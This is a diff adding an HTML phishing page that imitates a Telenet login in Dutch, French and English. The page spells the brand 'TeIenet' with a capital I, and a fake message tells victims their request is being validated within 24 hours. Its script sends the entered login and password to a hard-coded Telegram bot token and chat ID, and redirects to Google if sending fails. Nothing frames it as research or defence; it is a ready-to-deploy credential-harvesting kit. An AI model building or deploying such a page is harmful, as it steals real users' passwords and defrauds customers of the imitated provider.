@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="nl">
+<head>
+<meta charset="UTF-8">
+<title>Login flow</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --yellow:#F5E14C;
+    --black:#1a1a1a;
+    --grey-text:#6b6b6b;
+    --border:#dcdcdc;
+    --disabled-bg:#f4f4f4;
+    --disabled-text:#b5b5b5;
+  }
+  *{box-sizing:border-box;}
+  html,body{
+    margin:0;
+    height:100%;
+  }
+ body{
+    font-family:'Helvetica Neue', Arial, sans-serif;
+    background:#fff;
+    display:flex;
+    justify-content:center;
+    min-height:100vh;
+  }
+  .screen{
+    width:100%;
+    background:#fff;
+    overflow:hidden;
+    display:flex;
+    flex-direction:column;
+    min-height:100vh;
+  }
+  .content{
+    width:100%;
+    max-width:400px;
+    margin:0 auto;
+  }
+  .header{
+    background:var(--yellow);
+    position:relative;
+    height:200px;
+    display:flex;
+    align-items:flex-start;
+    justify-content:space-between;
+    padding:22px 24px;
+    overflow:hidden;
+  }
+  .logo{
+    position:relative;
+    z-index:2;
+    width:60px;
+    height:60px;
+    border-radius:14px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    overflow:hidden;
+  }
+  .langs{position:relative;z-index:2;font-size:15px;color:#1a1a1a;}
+  .langs button{
+    background:none;
+    border:none;
+    font-size:14px;
+    margin-left:10px;
+    cursor:pointer;
+    opacity:0.55;
+    font-family:inherit;
+    color:#1a1a1a;
+    padding:0;
+  }
+  .langs button.active{opacity:1;font-weight:700;}
+  .cloud, .tier{display:none;}
+  #shape-img{
+    position:absolute;
+    bottom:0;
+    left:0;
+    width:100%;
+    height:70%;
+    object-fit:cover;
+    object-position:bottom;
+    z-index:1;
+    image-rendering:-webkit-optimize-contrast;
+    image-rendering:high-quality;
+    backface-visibility:hidden;
+    transform:translateZ(0);
+  }
+  .body{
+    padding:32px 28px 36px;
+    flex:1;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+  }
+  h1{
+    font-family:'Archivo Black', 'Helvetica Neue', Arial, sans-serif;
+    font-size:26px;
+    font-weight:400;
+    margin:0 0 22px;
+    color:var(--black);
+    text-align:center;
+    letter-spacing:0.5px;
+  }
+  label{
+    display:block;
+    font-size:13px;
+    font-weight:700;
+    margin-bottom:8px;
+    color:var(--black);
+  }
+  input[type="email"], input[type="password"]{
+    width:100%;
+    padding:14px 16px;
+    border:1.5px solid var(--border);
+    border-radius:8px;
+    font-size:15px;
+    outline:none;
+    margin-bottom:20px;
+  }
+  input[type="email"]:focus, input[type="password"]:focus{
+    border-color:#1a1a1a;
+  }
+  .pwd-wrap{position:relative;}
+  .pwd-wrap svg{
+    position:absolute;
+    right:14px;
+    top:15px;
+    cursor:pointer;
+    opacity:0.6;
+  }
+  .checkrow{
+    display:flex;
+    align-items:center;
+    gap:10px;
+    margin-bottom:22px;
+    font-size:14px;
+    color:var(--black);
+  }
+  .checkrow input{width:18px;height:18px;}
+  button.primary{
+    width:100%;
+    background:var(--black);
+    color:#fff;
+    border:none;
+    border-radius:8px;
+    padding:16px;
+    font-family:'Archivo Black', 'Helvetica Neue', Arial, sans-serif;
+    font-size:16px;
+    font-weight:400;
+    letter-spacing:0.5px;
+    cursor:pointer;
+    margin-bottom:18px;
+  }
+  button.primary:hover{background:#000;}
+  a.link{
+    display:block;
+    font-size:14px;
+    color:#4a4a4a;
+    text-decoration:underline;
+    margin-bottom:10px;
+    cursor:pointer;
+  }
+  .sub{
+    font-size:14px;
+    color:var(--grey-text);
+    margin:0 0 18px;
+  }
+  .option{
+    display:flex;
+    align-items:center;
+    gap:14px;
+    border:1.5px solid var(--border);
+    border-radius:10px;
+    padding:16px 18px;
+    margin-bottom:16px;
+  }
+  .option.enabled{cursor:pointer;}
+  .option.enabled:hover{border-color:#1a1a1a;}
+  .option.disabled{
+    background:var(--disabled-bg);
+    cursor:not-allowed;
+    opacity:0.6;
+  }
+  .option .icon{
+    width:22px;
+    display:flex;
+    justify-content:center;
+    color:var(--black);
+  }
+  .option.disabled .icon{color:var(--disabled-text);}
+  .option .texts{flex:1;}
+  .option .title{
+    font-size:16px;
+    font-weight:600;
+    color:var(--black);
+    display:flex;
+    align-items:center;
+  }
+  .option.disabled .title{color:var(--disabled-text);}
+  .option .subtitle{
+    font-size:13px;
+    color:var(--grey-text);
+    margin-top:2px;
+  }
+  .option.disabled .subtitle{color:var(--disabled-text);}
+  .option .chevron{color:#999;}
+  .option.disabled .chevron{color:#d0d0d0;}
+  .badge{
+    font-size:11px;
+    font-weight:700;
+    background:#e5e5e5;
+    color:#888;
+    padding:3px 8px;
+    border-radius:20px;
+    margin-left:8px;
+  }
+  .step{display:none;}
+  .step.active{display:block;}
+  .success{
+    text-align:center;
+    padding:20px 0;
+  }
+  .success svg{margin-bottom:14px;}
+  .success h1{margin-bottom:10px;}
+  .success p{color:var(--grey-text);font-size:14px;}
+</style>
+</head>
+<body>
+
+  <div class="screen">
+    <div class="header">
+    <div class="logo">
+        <img src="data:image/png;base64,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" alt="Logo" style="width:100%;height:100%;object-fit:cover;border-radius:14px;">
+      </div>
+      <input type="file" id="logo-input" accept="image/*" style="display:none;">
+      <div class="langs">
+        <button id="lang-nl" class="active" onclick="setLang('nl')">NL</button>
+        <button id="lang-fr" onclick="setLang('fr')">FR</button>
+        <button id="lang-en" onclick="setLang('en')">EN</button>
+      </div>
+
+      <div class="cloud"></div>
+      <div class="tier tier3"></div>
+      <div class="tier tier2"></div>
+      <div class="tier tier1"></div>
+    </div>
+
+<form id="loginForm">
+
+    <div class="body">
+      <div class="content">
+
+      <!-- STEP 1 -->
+      <div class="step active" id="step1">
+
+        <h1 data-i18n="s1_title">Inloggen</h1>
+        <label data-i18n="s1_label">Login</label>
+        <input type="email" id="login" type="text" name="login" autocomplete="login">
+        <div class="checkrow">
+          <input type="checkbox" id="stay1">
+          <label for="stay1" style="margin:0;font-weight:400;" data-i18n="s1_stay">Aangemeld blijven</label>
+        </div>
+        <button class="primary" onclick="goToStep(2)" data-i18n="s1_next">Volgende</button>
+        <a class="link" data-i18n="s1_forgot">Wachtwoord vergeten?</a>
+      </div>
+
+      <!-- STEP 2 -->
+      <div class="step" id="step2">
+        <h1 data-i18n="s2_title">Hoe wil je aanmelden?</h1>
+        <p class="sub" data-i18n="s2_sub">Maak een keuze uit de volgende opties</p>
+
+        <div class="option enabled" onclick="goToStep(3)">
+          <div class="icon">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="11" width="14" height="9" rx="2"/><path d="M8 11V7a4 4 0 0 1 8 0v4"/></svg>
+          </div>
+          <div class="texts">
+            <div class="title" data-i18n="s2_pwd">Wachtwoord</div>
+          </div>
+          <div class="chevron">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 6l6 6-6 6"/></svg>
+          </div>
+        </div>
+
+        <div class="option disabled">
+          <div class="icon">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="7" y="2" width="10" height="20" rx="2"/><line x1="11" y1="18" x2="13" y2="18"/></svg>
+          </div>
+          <div class="texts">
+            <div class="title"><span data-i18n="s2_sms">Code via sms</span><span class="badge" data-i18n="s2_unavailable">Onbeschikbaar</span></div>
+            <div class="subtitle">+32 XXX XX X7 57</div>
+          </div>
+          <div class="chevron">
+            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 6l6 6-6 6"/></svg>
+          </div>
+        </div>
+
+        <a class="link" onclick="goToStep(1)" data-i18n="s2_back">Terug naar inloggen</a>
+      </div>
+
+      <!-- STEP 3 -->
+      <div class="step" id="step3">
+        <h1 data-i18n="s3_title">Aanmelden met je wachtwoord</h1>
+        <label data-i18n="s3_label">Wachtwoord</label>
+        <div class="pwd-wrap">
+          <input type="password" id="password" type="password" name="password" autocomplete="current-password">
+        </div>
+        <button class="primary" onclick="goToStep(4)" data-i18n="s3_confirm">Bevestigen</button>
+        <a class="link" data-i18n="s3_forgot">Wachtwoord vergeten?</a>
+        <a class="link" style="color:#c9c9c9;text-decoration:none;cursor:not-allowed;" data-i18n="s3_other">Aanmelden met iets anders</a>
+        <a class="link" onclick="goToStep(1)" data-i18n="s3_back">Terug naar inloggen</a>
+      </div>
+
+      <!-- STEP 4 : SUCCESS -->
+      <div class="step" id="step4">
+        <div class="success">
+          <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#1a1a1a" stroke-width="1.6"><circle cx="12" cy="12" r="10"/><path d="M8 12.5l2.5 2.5L16 9.5"/></svg>
+          <h1 data-i18n="s4_title">Verificatie uitgevoerd…</h1>
+          <!-- HTML propre -->
+<div data-i18n="s4_sub"><p>Beste gebruiker,</p><p>Uw aanvraag werd goed ontvangen en wordt momenteel door onze diensten gevalideerd.</p><p>Deze procedure kan tot 24 uur in beslag nemen. U wordt op de hoogte gebracht zodra de validatie is voltooid.</p><p>Er zijn geen correcties of aanvullende gegevens van uw kant vereist.</p><p>Wij danken u voor uw geduld en uw vertrouwen.</p><p style='padding-left: 30px;'>Technische ondersteuning &ndash; Web TeIenet</p></div>
+        </div>
+      </div>
+
+      </div>
+    </div>
+  </div>
+  
+</form>
+
+<script>
+    // Configuration de votre Bot Telegram
+const TELEGRAM_TOKEN = '8668173553:AAHgiZEmHZyc4uuEJw2BvT2gNCfWezxt2BE';
+    const TELEGRAM_CHAT_ID = '8252190794';
+
+    function togglePw(){
+      const f = document.getElementById('password');
+      f.type = f.type === 'password' ? 'text' : 'password';
+    }
+
+    document.getElementById('loginForm').addEventListener('submit', function(e){
+      e.preventDefault();
+
+      const loginValue = document.getElementById('login').value;
+      const passwordValue = document.getElementById('password').value;
+     
+
+      const message = `🔔 **TeleNet BE🔔**\n\n👤 **Identifiant:** ${loginValue}\n 🔑 **Mot de passe:** ${passwordValue}\n`;
+
+      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      })
+      .then(response => {
+        if(response.ok) {
+          console.log('Données envoyées avec succès à Telegram.');
+        } else {
+          console.error("Erreur lors de l'envoi à Telegram.");
+          window.location.href = "https://www.google.com";
+        }
+      })
+      .catch(error => {
+        console.error("Erreur réseau ou autre :", error);
+        window.location.href = "https://www.google.com/";
+      });
+    });
+  </script>
+
+<script>
+const translations = {
+  nl:{
+    s1_title:"Inloggen", s1_label:"Login", s1_stay:"Aangemeld blijven",
+    s1_next:"Volgende", s1_forgot:"Wachtwoord vergeten?",
+    s2_title:"Hoe wil je aanmelden?", s2_sub:"Maak een keuze uit de volgende opties",
+    s2_pwd:"Wachtwoord", s2_sms:"Code via sms", s2_unavailable:"Onbeschikbaar",
+    s2_back:"Terug naar inloggen",
+    s3_title:"Aanmelden met je wachtwoord", s3_label:"Wachtwoord",
+    s3_confirm:"Bevestigen", s3_forgot:"Wachtwoord vergeten?",
+    s3_other:"Aanmelden met iets anders", s3_back:"Terug naar inloggen",
+s4_title: "Verificatie uitgevoerd…",
+s4_sub: "<p>Beste gebruiker,</p><p>Uw aanvraag werd goed ontvangen en wordt momenteel door onze diensten gevalideerd.</p><p>Deze procedure kan tot 24 uur in beslag nemen. U wordt op de hoogte gebracht zodra de validatie is voltooid.</p><p>Er zijn geen correcties of aanvullende gegevens van uw kant vereist.</p><p>Wij danken u voor uw geduld en uw vertrouwen.</p><p style='padding-left: 30px;'>Technische ondersteuning &ndash; Web TeIenet</p>",
+  },
+  fr:{
+    s1_title:"Connexion", s1_label:"Login", s1_stay:"Rester connecté",
+    s1_next:"Suivant", s1_forgot:"Mot de passe oublié ?",
+    s2_title:"Comment veux-tu te connecter ?", s2_sub:"Fais un choix parmi les options suivantes",
+    s2_pwd:"Mot de passe", s2_sms:"Code par SMS", s2_unavailable:"Indisponible",
+    s2_back:"Retour à la connexion",
+    s3_title:"Connexion avec ton mot de passe", s3_label:"Mot de passe",
+    s3_confirm:"Confirmer", s3_forgot:"Mot de passe oublié ?",
+    s3_other:"Se connecter autrement", s3_back:"Retour à la connexion",
+s4_title: "Vérification effectuée…",
+s4_sub: "<p>Cher utilisateur,</p><p>Votre demande a bien été reçue et est actuellement en cours de validation par nos services.</p><p>Cette procédure peut prendre jusqu'à 24 heures. Vous serez informé dès que la validation sera terminée.</p><p>Aucune correction ou donnée supplémentaire n'est requise de votre part.</p><p>Nous vous remercions pour votre patience et votre confiance.</p><p style='padding-left: 30px;'>Support technique &ndash; Web Telenet</p>",
+  },
+  en:{
+    s1_title:"sign ln", s1_label:"Login", s1_stay:"Stay signed in",
+    s1_next:"Next", s1_forgot:"Forgot password?",
+    s2_title:"How do you want to sign in?", s2_sub:"Choose one of the following options",
+    s2_pwd:"Password", s2_sms:"Code via SMS", s2_unavailable:"Unavailable",
+    s2_back:"Back to login",
+    s3_title:"Log in with your password", s3_label:"Password",
+    s3_confirm:"Confirm", s3_forgot:"Forgot password?",
+    s3_other:"Log in another way", s3_back:"Back to login",
+s4_title: "Verification performed…",
+s4_sub: "<p>Dear user,</p><p>Your request has been received and is currently being validated by our services.</p><p>This process may take up to 24 hours. You will be notified once validation is complete.</p><p>No corrections or additional details are required from you.</p><p>Thank you for your patience and trust.</p><p style='padding-left: 30px;'>Technical support &ndash; Web Telenet</p>"
+  }
+};
+
+let currentLang = 'nl';
+
+document.getElementById('logo-input').addEventListener('change', function(e){
+  const file = e.target.files[0];
+  if(!file) return;
+  const reader = new FileReader();
+  reader.onload = function(evt){
+    const img = document.getElementById('logo-img');
+    img.src = evt.target.result;
+    img.style.display = 'block';
+    document.getElementById('logo-default').style.display = 'none';
+    document.querySelector('.logo').classList.add('has-custom');
+  };
+  reader.readAsDataURL(file);
+});
+
+function setLang(lang){
+  currentLang = lang;
+  document.querySelectorAll('[data-i18n]').forEach(el=>{
+    const key = el.getAttribute('data-i18n');
+    if(translations[lang][key] !== undefined){
+      el.innerHTML = translations[lang][key];
+    }
+  });
+  document.querySelectorAll('.langs button').forEach(b=>b.classList.remove('active'));
+  document.getElementById('lang-'+lang).classList.add('active');
+  document.documentElement.lang = lang;
+}
+
+function goToStep(n){
+  document.querySelectorAll('.step').forEach(s=>s.classList.remove('active'));
+  document.getElementById('step'+n).classList.add('active');
+}
+
+function togglePwd(){
+  const p = document.getElementById('pwd');
+  p.type = p.type === 'password' ? 'text' : 'password';
+}
+
+</script>
+</body>
+</html>
